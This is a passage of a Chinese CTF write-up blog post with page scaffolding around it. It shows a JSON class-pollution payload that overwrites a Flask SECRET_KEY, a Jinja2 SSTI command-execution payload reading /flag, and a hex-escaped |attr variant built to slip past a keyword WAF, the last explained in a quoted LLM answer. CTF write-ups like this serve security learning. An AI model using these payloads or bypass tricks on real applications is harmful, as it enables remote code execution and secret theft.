+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hellocat /flaghacker&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>我们会发现，这样可以成功修改密钥，从而签上名通过校验。但是在waf一步会被拦下来<code>WAF blocked: Dangerous pattern detected</code>（<s>问为什么不试试env？当然是试过了发现啥也没有😭</s></p>
+<p>这是我们求助万能的LLM老师：</p>
+<blockquote>
+<h4 id="正常-SSTI-Payload-为什么会被拦？">正常 SSTI Payload 为什么会被拦？</h4>
+<p>正常读 flag 的 payload 是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里面包含了大量黑名单词：</p>
+<ul>
+<li><code>globals</code></li>
+<li><code>os</code></li>
+<li><code>read</code></li>
+<li><code>&#123;&#123;`、`&#125;&#125;</code></li>
+</ul>
+<p>所以直接被 WAF 拦截。</p>
+<h4 id="attr-十六进制转义"><code>|attr</code> + 十六进制转义</h4>
+<p>Jinja2 有一个过滤器 <code>|attr</code>，可以按属性名访问对象属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum|attr(&#x27;__globals__&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这等价于 <code>lipsum.__globals__</code>。</p>
+<p>但 <code>__globals__</code> 本身在黑名单里（<code>globals</code>），所以不能明文写。<br>
+于是把属性名写成 <strong>十六进制转义字符串</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum|attr(&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>'\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'</code> 在 Python/Jinja2 字符串解析后就是 <code>__globals__</code>。<br>
+WAF 检查时看到的是一堆 <code>\x5f</code>，里面没有 <code>globals</code> 这个连续子串，所以不触发黑名单。</p>
+<p>同理：</p>
+<ul>
+<li><code>'\x6f\x73'</code> → <code>os</code></li>
+<li><code>'\x70\x6f\x70\x65\x6e'</code> → <code>popen</code></li>
+<li><code>'\x63\x61\x74\x20\x2f\x66\x6c\x61\x67'</code> → <code>cat /flag</code></li>
+<li><code>'\x72\x65\x61\x64'</code> → <code>read</code></li>
+</ul>
+<p>最终 payload 变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum|attr(&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&#x27;)(&#x27;\x6f\x73&#x27;)|attr(&#x27;\x70\x6f\x70\x65\x6e&#x27;)(&#x27;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&#x27;)|attr(&#x27;\x72\x65\x61\x64&#x27;)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>不过这LLM不知道怎么吧<code>&#123;&#123;&#125;&#125;</code>带上了，在他给的W2倒是有，非常怪异。这里我们直接把<code>&#123;&#123;&#125;&#125;</code>换成善良的hellohacker，然后再次注入即可拿到flag。</p>
+
+  </div>
+
+  <footer class="article-reactions">
+    <div class="reaction-group">
+      <button type="button" class="reaction reaction--comment" aria-label="跳转到评论区" data-action="scroll-to-comments">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-message-circle flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-message-circle"></use></svg>
+
+      </button>
+      <span class="reaction-label">评论</span>
+      
+    </div>
+    <div class="reaction-group reaction-group--right">
+      
+<div class="reaction-pop reaction-pop--right">
+  <button type="button" class="reaction reaction--reward" data-action="toggle-pop" aria-expanded="false" aria-label="也许会发生一些好事！">
+    
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-imagesfaviconpng flatpaper-icon" aria-hidden="true"><circle cx="12" cy="12" r="3"/></svg>
+
+  </button>
+  <span class="reaction-label">也许会发生一些好事！</span>
+  <div class="reaction-bubble" role="dialog" aria-label="这里只有伟大的closuresama哒！" hidden>
+    <div class="reaction-bubble-title">这里只有伟大的closuresama哒！</div>
+    <img class="reaction-bubble-img no-zoom" src="/images/const_img/kur0sia.jpg" alt="这里只有伟大的closuresama哒！" loading="lazy">
+  </div>
+</div>
+
+      <button type="button" class="reaction reaction--share" aria-label="分享" data-action="share">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-share-2 flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-share-2"></use></svg>
+
+      </button>
+      <span class="reaction-label">分享</span>
+    </div>
+  </footer>
+
+  
+
+
+  <nav class="article-actions">
+    
+      <a class="article-action article-action--prev" href="/2026/09/28/ctfnote/XXE/">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-left"></use></svg>
+
+        <span class="action-label">上一篇</span>
+        <span class="action-title">XXE</span>
+      </a>
+    
+    
+      <a class="article-action article-action--next" href="/2026/09/15/daily/exp_sub3_daily/">
+        <span class="action-label">下一篇</span>
+        <span class="action-title">注水：练车的一些感想</span>
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
+
+      </a>
+    
+  </nav>
+</article>
+</div>
+
+<button type="button" class="back-to-top" data-action="scroll-to-top" aria-label="返回顶部" hidden>
+  
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-up"></use></svg>
+
+</button>
+
+
+  <section class="related-paper">
+    <header class="related-paper__head">
+      <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-link"></use></svg>
+相关文章</h2>
+      <a class="related-paper__more" href="/archives/">
+        <span>查看更多</span>
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
+
+      </a>
+    </header>
+    <div class="related-paper__grid">
+      
+        <a class="related-card" href="/2026/11/09/ctfnote/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/yuri_001.webp" alt="敏感信息泄露" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">敏感信息泄露</strong>
+            <em class="related-card__date">2026-11-09</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/11/09/ctfnote/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/yuri_001.webp" alt="敏感信息泄露" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">敏感信息泄露</strong>
+            <em class="related-card__date">2026-11-09</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/11/05/ctfgame/17_%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-2 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/06.webp" alt="WP-第17届极客大挑战" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">WP-第17届极客大挑战</strong>
+            <em class="related-card__date">2026-11-05</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/11/02/ctfnote/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/06.webp" alt="文件上传" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">文件上传</strong>
+            <em class="related-card__date">2026-11-02</em>
+          </span>
+        </a>
+      
+    </div>
+  </section>
+
+
+      
+
+<section class="comments-section comments-section--giscus" aria-label="评论">
+  <header class="comments-section__head">
+    <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-message-circle flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-message-circle"></use></svg>
+评论</h2>
+  </header>
+  <div class="giscus" id="giscus-comments"></div>
+  <script src="https://giscus.app/client.js"
+    data-repo="aClosure/aClosure.github.io"
+    data-repo-id="R_kgDOT1T-4w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOT1T-484DDMyO"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous" async></script>
+  <script>
+  // giscus is rendered inside its own iframe, so it can't see the theme's
+  // dark-mode class. Keep it in sync by postMessage: once when giscus reports
+  // its first message, and again whenever main.js toggles <html class="dark-mode">.
+  (function () {
+    var LIGHT = "light";
+    var DARK = "dark_dimmed";
+    function currentTheme() {
+      return document.documentElement.classList.contains('dark-mode') ? DARK : LIGHT;
+    }
+    function syncTheme() {
+      var frame = document.querySelector('iframe.giscus-frame');
+      if (!frame || !frame.contentWindow) return;
+      frame.contentWindow.postMessage({ giscus: { setConfig: { theme: currentTheme() } } }, 'https://giscus.app');
+    }
+    window.addEventListener('message', function (event) {
+      if (event.origin !== 'https://giscus.app') return;
+      if (!event.data || !event.data.giscus) return;
+      syncTheme();
+    });
+    if (window.MutationObserver) {
+      new MutationObserver(syncTheme).observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['class']
+      });
+    }
+  })();
+  </script>
+</section>
+
+
+    </section>
+    
+  </main>
+
+  <div class="sidebar-backdrop js-sidebar-close" aria-hidden="true"></div>
+
+  
+<footer class="site-footer">
+  <span class="site-footer__left">© 奇妙的喵喵据点 By kur0sia!</span>
+  
+    <span class="site-footer__right">
+      
+        <span class="site-footer__row"><span class="site-footer__powered-prefix">Powered by Theme</span> <a href="https://github.com/Homulilly/hexo-theme-flatpaper" target="_blank" rel="noopener">FlatPaper</a></span>
+      
+    </span>
+  
+</footer>
+
+  
+<div class="search-panel" aria-hidden="true" data-index-url="/flatpaper-search.json">
+  <div class="search-backdrop js-search-close"></div>
+  <section class="search-dialog" role="dialog" aria-modal="true" aria-label="搜索文章">
+    <span class="tape tape--top-left" aria-hidden="true"></span>
+    <header class="search-head">
+      <h2><span class="green-dot"></span>搜索文章</h2>
+      <button class="icon-button js-search-close" type="button" aria-label="关闭搜索">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-x"></use></svg>
+
+      </button>
+    </header>
+    <label class="search-field">
+      
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-search flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-search"></use></svg>
+
+      <input id="flatpaper-search" class="search-input" type="search" placeholder="输入关键词，按 Esc 关闭" autocomplete="off">
+    </label>
+    <div class="search-results" data-empty="输入关键词后显示匹配的文章">
+      <p class="search-empty">输入关键词后显示匹配的文章</p>
+    </div>
+  </section>
+</div>
+
+  <script>
+  window.FLATPAPER_I18N = {"language":"zh-CN","common.posts":"文章","common.categories":"分类","common.tags":"标签","common.comments":"评论","common.share":"分享","common.page":"页面","common.archive":"归档","common.post_list":"文章列表","common.search_posts":"搜索文章","common.random_posts":"随机文章","common.reward":"赞赏","common.view_all":"查看全部","pagination.prev":"上一页","pagination.next":"下一页","pagination.post_pager":"文章分页","pagination.archive_pager":"归档分页","index.featured":"精选文章","index.pinned":"置顶","index.read_more":"阅读全文","index.previous_slide":"上一张","index.next_slide":"下一张","index.carousel_pagination":"轮播页码","index.carousel_slide":"第 %d 张","index.latest_posts":"最新文章","index.empty_posts":"还没有文章。创建第一篇文章后，这里会显示最新内容。","archive.title":"归档","archive.post_list":"文章列表","taxonomy.category_count":"%d 篇","taxonomy.empty_categories":"暂时还没有分类。","taxonomy.empty_tags":"暂时还没有标签。","links.label":"友链","links.title":"友情链接","links.empty_data":"暂未加载到友链数据。请确认 source/_data/links.yml 存在并已 hexo clean。","links.rss_label":"%s 的 RSS","friends_feed.label":"朋友圈","friends_feed.title":"友链朋友圈","friends_feed.loading":"正在加载友链动态…","friends_feed.missing_url":"暂未配置 all.json 地址。","friends_feed.load_failed":"友链动态加载失败，请稍后再试。","friends_feed.empty":"暂时没有抓取到友链文章。","friends_feed.load_more":"加载更多","friends_feed.updated_at":"更新于 %s","friends_feed.friend_count":"%d 位友邻","friends_feed.active_count":"%d 位活跃","friends_feed.article_count":"%d 篇文章","friends_feed.unknown_author":"未知站点","friends_feed.date_unknown":"时间未知","guestbook.label":"留言板","guestbook.title":"留言板","guestbook.loading":"正在铺开留言墙…","guestbook.missing_config":"留言墙需要评论系统：请在主题配置中设置 comments: twikoo（并填写 envId）或 comments: artalk（并填写 server）。","guestbook.load_failed":"留言加载失败，请稍后再试。","guestbook.empty":"墙上还空着，来贴第一张留言吧！","guestbook.load_more":"展开更多留言","guestbook.total_count":"共 %d 条留言","guestbook.latest_note":"墙上展示最新 %d 条","guestbook.jump_to_comment":"查看留言","guestbook.sort_time":"查看最新","guestbook.sort_random":"随机排序","guestbook.anonymous":"匿名访客","guestbook.write_hint":"在下方留言，刷新后就会贴到墙上","post.scroll_to_comments":"跳转到评论区","post.previous":"上一篇","post.next":"下一篇","post.no_previous":"没有更早的文章了","post.no_next":"已经是最新的一篇","post.back_to_top":"返回顶部","post.related_posts":"相关文章","post.view_more":"查看更多","not_found.label":"页面走丢了","not_found.title":"找不到这个页面","not_found.text":"这个地址可能已经移动、删除，或者从未存在。","not_found.home":"返回首页","not_found.search":"搜索文章","search.placeholder":"输入关键词，按 Esc 关闭","search.empty":"输入关键词后显示匹配的文章","search.loading":"正在加载搜索索引…","search.load_failed":"搜索索引加载失败，请重新打开搜索重试","search.no_result":"没有找到与 \"%s\" 相关的文章","search.close":"关闭搜索","code.copy":"复制代码","code.collapse":"折叠代码","code.expand":"展开代码","heading.anchor":"链接到此节: %s","head.tag":"标签：%s","head.category":"分类：%s","head.archive":"归档","head.archive_with_date":"归档：%s","head.page_number":"第 %d 页","navigation.primary":"主导航","navigation.mobile":"移动端导航","navigation.brand_home":"FlatPaper 首页","navigation.brand_menu":"打开站点导航","navigation.open_sidebar":"打开侧边栏","navigation.close_sidebar":"关闭侧边栏","navigation.sidebar":"侧边栏","navigation.sidebar_tools":"侧边栏工具","navigation.site_links":"站点链接","navigation.site_info":"站点信息","colors.choose_theme_color":"选择主题色","colors.theme_color":"主题色","colors.toggle_color_mode":"切换颜色模式","colors.green":"绿色","colors.purple":"紫色","colors.pink":"粉色","colors.sakura":"樱花粉","colors.blue":"蓝色","colors.orange":"橙色","colors.black":"黑色","profile.default_bio":"热爱生活，热爱代码，喜欢分享技术与生活中的点滴。","welcome.cta":"开始阅读","welcome.title":"欢迎来到 FlatPaper","welcome.text":"一个专注于内容与阅读体验的博客主题。","home_hero.label":"首页开屏","home_hero.enter":"开始阅读","home_hero.note":"今日","home_hero.default_subtitle":"日常记录","home_hero.nav_links":"开屏导航","home_hero.profile_links":"个人链接","home_hero.tools":"开屏工具","home_hero.shuffle_stickers":"打乱贴纸位置","home_hero.link":"链接","home_hero.sticker_image":"贴纸图片","home_hero.visit_confirm":"要访问 %s 吗？","home_hero.visit":"访问","home_hero.cancel":"取消","toc.title":"文章目录","toc.empty":"目录会根据文章标题自动生成。","toc.expand_all":"展开全部目录","toc.collapse_all":"收起全部目录","sidebar.hot_tags":"热门标签","sidebar.latest_posts":"最新文章"};
+  </script>
+  
+<script src="/js/main.js"></script>
+
+  
+  <div class="fp-progress" aria-hidden="true"></div>
+  
+  <script>
+(function () {
+  var bar = document.querySelector('.fp-progress');
+  if (!bar || !document.body.classList.contains('is-post')) return;
+
+  // 原生可用就不用我们管：先看计算值，再用 CSS.supports 兜一道
+  var timeline = '';
+  try { timeline = getComputedStyle(bar).animationTimeline || ''; } catch (e) {}
+  var native = (timeline && timeline !== 'auto' && timeline !== 'none') ||
+    !!(window.CSS && CSS.supports &&
+       CSS.supports('animation-timeline', 'scroll()') &&
+       CSS.supports('animation-duration', 'auto'));
+  if (native) return;
+
+  var raf = 0;
+  function update() {
+    raf = 0;
+    var max = document.documentElement.scrollHeight - window.innerHeight;
+    var ratio = max > 0 ? Math.min(1, Math.max(0, window.scrollY / max)) : 0;
+    bar.style.transform = 'scaleX(' + ratio + ')';
+  }
+  function onScroll() { if (!raf) raf = requestAnimationFrame(update); }
+  window.addEventListener('scroll', onScroll, { passive: true });
+  window.addEventListener('resize', onScroll, { passive: true });
+  update();
+})();
+</script>
+
+  
+  <script src="/js/bgm-player.js" defer></script>
+  
+</body>
+</html>
